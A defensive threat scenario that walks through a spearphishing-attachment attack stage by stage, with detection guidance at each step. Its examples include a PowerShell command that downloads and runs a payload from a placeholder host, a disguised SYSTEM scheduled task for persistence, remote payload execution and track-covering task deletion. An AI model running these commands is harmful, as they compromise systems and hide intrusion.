Pattern Name: Spearphishing Attachment

Scenario Overview: This attack scenario illustrates how an adversary uses a spearphishing email with a malicious attachment to gain initial access to a target system. The attack progresses through multiple stages, including the opening of the attachment, execution of a malicious payload, and subsequent actions that leverage scheduled tasks for persistence and lateral movement.

Attack Flow Breakdown:

**Stage 1: Initial Access via Spearphishing Email**
- **Applications Involved**: Outlook
- **User Action**: The user receives a spearphishing email that appears to be from a trusted source, containing a malicious attachment (e.g., a Word document).
- **Key Artifacts**: Email headers, attachment file (e.g., `invoice.docx`).
- **Detection Focus**: Monitor for unusual email patterns, such as sender addresses that mimic legitimate domains, and attachments with macros.

```shell
# Example of a suspicious email header
# Check for emails with attachments from external domains
grep -i "invoice.docx" /var/log/mail.log
```

**Stage 2: Execution of Malicious Payload**
- **Applications Involved**: Microsoft Word, PowerShell
- **User Action**: The user opens the attachment, which prompts them to enable macros. Upon enabling macros, a PowerShell script is executed to download and execute a malicious payload.
- **Key Artifacts**: PowerShell command execution logs, downloaded files (e.g., `malware.exe`).
- **Detection Focus**: Monitor for PowerShell execution with suspicious command-line arguments, especially those involving `Invoke-WebRequest` or `IEX`.

```shell
# Example of a PowerShell command that downloads and executes a payload
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://malicious.com/malware.exe' -OutFile 'C:\Users\Public\malware.exe'; Start-Process 'C:\Users\Public\malware.exe'"
```

**Stage 3: Establishing Persistence via Scheduled Task**
- **Applications Involved**: schtasks.exe
- **User Action**: The malicious payload creates a scheduled task to ensure persistence, allowing the malware to execute on system startup.
- **Key Artifacts**: Scheduled task entries, task creation logs.
- **Detection Focus**: Monitor for the use of `schtasks.exe` with suspicious parameters, particularly those that create tasks with names that mimic legitimate system tasks.

```shell
# Example of creating a scheduled task for persistence
schtasks /create /tn "Windows Update Service" /tr "C:\Users\Public\malware.exe" /sc ONLOGON /ru "SYSTEM"
```

**Stage 4: Lateral Movement and Further Exploitation**
- **Applications Involved**: PowerShell, Remote Desktop Protocol (RDP)
- **User Action**: The malware may attempt to use the established scheduled task to execute additional payloads or move laterally to other systems within the network.
- **Key Artifacts**: RDP connection logs, additional scheduled tasks created on other systems.
- **Detection Focus**: Monitor for unusual RDP connections and the creation of scheduled tasks on other machines, especially those initiated by the SYSTEM account.

```shell
# Example of a PowerShell command to execute a payload on a remote machine
Invoke-Command -ComputerName "RemotePC" -ScriptBlock { Start-Process "C:\Users\Public\malware.exe" }
```

**Stage 5: Cleanup and Evasion Techniques**
- **Applications Involved**: Registry Editor, schtasks.exe
- **User Action**: The attacker may modify or delete the scheduled task to evade detection or hide their presence.
- **Key Artifacts**: Registry keys related to scheduled tasks, task deletion logs.
- **Detection Focus**: Monitor for modifications to scheduled tasks and registry keys that may indicate attempts to hide malicious activity.

```shell
# Example of deleting a scheduled task to cover tracks
schtasks /delete /tn "Windows Update Service" /f
```
